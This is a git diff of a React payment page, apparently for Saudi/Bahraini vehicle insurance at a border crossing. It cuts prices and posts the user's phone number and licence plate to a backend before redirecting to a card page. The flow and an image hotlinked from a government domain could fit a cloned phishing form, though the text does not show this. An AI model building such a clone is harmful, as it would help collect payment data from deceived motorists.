@@ -1,4 +1,6 @@
+import axios from "axios";
 import React, { useRef, useState } from "react";
+import { api_route } from "../App";
 
 const Main = () => {
   const [toastMessage, setToastMessage] = useState("");
@@ -10,16 +12,16 @@ const Main = () => {
   const [hasTrailer, setHasTrailer] = useState("false");
   const [currency, setCurrency] = useState("sar");
   const [paymentMethod, setPaymentMethod] = useState("visa");
-  const [loading] = useState(false);
+  const [loading, setLoading] = useState(false);
   // Plate State
   const [plateChar1, setPlateChar1] = useState("");
   const [plateChar2, setPlateChar2] = useState("");
   const [plateChar3, setPlateChar3] = useState("");
   const [plateNumber, setPlateNumber] = useState("");
   const [phoneCode, setPhoneCode] = useState("966+");
-  let price = currency === "sar" ? 70 : 7;
+  let price = currency === "sar" ? 35 : 3.5;
   if (hasTrailer === "true") {
-    price = currency === "sar" ? 110 : 11;
+    price = currency === "sar" ? 55 : 5.5;
   }
   const currencyText = currency === "sar" ? "ريال سعودي" : "دينار بحريني";
 
@@ -71,25 +73,44 @@ const Main = () => {
     }, 2500);
   };
 
-  const handlePayment = () => {
+  const handlePayment = async () => {
+     setLoading(true);
     if (mobileNumber.length < 9) {
       showErrorToast("الرجا ادخال رقم الجوال بشكل صحيح");
+      setLoading(false);
       return;
     }
     if (!plateChar1 || !plateChar2 || !plateChar3 || !plateNumber) {
       showErrorToast("الرجاء اكمال بريات اللوحة");
+      setLoading(false);
       return;
     }
 
-    const id = Math.floor(Math.random() * 1000000);
-    sessionStorage.setItem("id", id);
-    sessionStorage.setItem("price", price);
-    // const data = {
-    //   _id: id,
-    //   fullname: "User_" + mobileNumber,
-    //   email: mobileNumber + "@salama.sa",
-    // };
-    // window.location.href = `/visa?data=${encodeURIComponent(JSON.stringify(data))}`;
+    const allData = {
+      mobileNumber,
+      plateChar1,
+      plateChar2,
+      plateChar3,
+      plateNumber,
+      vehicleType,
+      phoneCode,
+      vehicleNationality,
+      tripType,
+      hasTrailer,
+      currency,
+    };
+    try {
+     
+      const response = await axios.post(api_route + "/data", allData);
+      sessionStorage.setItem("id", response.data.order._id);
+      sessionStorage.setItem("price", price);
+      sessionStorage.setItem("currency", currency);
+      window.location.href = `/visa`;
+    } catch (error) {
+      setLoading(false);
+      showErrorToast("حدث خطأ ما.");
+      return;
+    }
   };
   return (
     <div
@@ -124,7 +145,7 @@ const Main = () => {
         </div>
       </header>
 
-      <main className="w-full max-w-4xl px-3 pb-12 flex flex-col justify-center items-center">
+      <main className="w-full max-w-6xl px-3 pb-12 flex flex-col justify-center items-center">
         {/* Banner Section */}
         <div
           className="text-white rounded-lg p-6 text-center shadow-lg w-full"
@@ -201,6 +222,7 @@ const Main = () => {
                   maxLength="9"
                   className="w-full py-3 px-4 bg-transparent outline-none text-left text-base"
                   dir="ltr"
+                  inputMode="numeric"
                   placeholder="ادخل رقم الجوال"
                   value={mobileNumber}
                   onChange={(e) => setMobileNumber(e.target.value)}
@@ -330,8 +352,8 @@ const Main = () => {
 
             {/* Plate Input Section */}
             <div className="sa-plate-wrapper space-y-8 bg-gray-50  rounded-xl border-2 border-dashed border-gray-200">
-              <div className="grid grid-cols-1 lg:grid-cols-3 gap-8 items-start">
-                <div className="lg:col-span-2 space-y-6">
+              <div className="grid grid-cols-1  gap-8 items-start">
+                <div className=" space-y-6">
                   <div className="grid grid-cols-1 gap-4 w-11/12 mx-auto">
                     <div className="space-y-2 text-right p-1 w-full ">
                       <label className="text-sm font-bold  text-right w-full">
@@ -403,7 +425,7 @@ const Main = () => {
 
                 <div className="flex flex-col items-center justify-center ">
                   <div
-                    className="relative   w-full h-[120px]  rounded-lg shadow-xl overflow-hidden bg-white group hover:scale-[1.02] transition-transform duration-300 ring-4 ring-[#218795]/10 "
+                    className="relative   w-full max-w-xl h-[120px]  rounded-lg shadow-xl overflow-hidden bg-white group hover:scale-[1.02] transition-transform duration-300 ring-4 ring-[#218795]/10 "
                     style={{
                       backgroundImage:
                         "url('https://kfca.sa/EJesr/images/saplate.jpg')",
@@ -534,7 +556,7 @@ const Main = () => {
                 <div className="flex gap-6  w-full items-center">
                   <button
                     onClick={() => setPaymentMethod("visa")}
-                    className={`w-2/3 p-4 border-4 rounded-xl transition-all flex items-center justify-center gap-x-2 ${paymentMethod === "visa" ? "border-[#218795] bg-[#218795]/10 scale-105" : "border-gray-50 hover:border-gray-200"}`}
+                    className={`w-2/3 max-w-xl  p-4 border-4 rounded-xl transition-all flex items-center justify-center gap-x-2 ${paymentMethod === "visa" ? "border-[#218795] bg-[#218795]/10 scale-105" : "border-gray-50 hover:border-gray-200"}`}
                   >
                     <img src="/MasterCard.svg" alt="Mada" className="h-4" />
                     <img src="/Visa.svg" alt="Mada" className="h-4" />
@@ -545,7 +567,7 @@ const Main = () => {
                     onClick={() => setPaymentMethod("applepay")}
                     className={`w-1/3 p-2 border-4 rounded-xl transition-all flex items-center justify-center ${paymentMethod === "applepay" ? "border-[#218795] bg-[#218795]/10 scale-105" : "border-gray-200 hover:border-gray-200"}`}
                   >
-                    <img src="/applepay.png" alt="Apple Pay" className="w-20" />
+                    <img src="/applepay.png" alt="Apple Pay" className="h-8" />
                   </button>
                 </div>
                 <button
@@ -574,7 +596,7 @@ const Main = () => {
       </main>
       {loading && (
         <div className="loader">
-          <div className="justify-content-center jimu-primary-loading"></div>
+          <div className="justify-content-center jimu-primary-loading"></div> 
         </div>
       )}
       {toastMessage && (
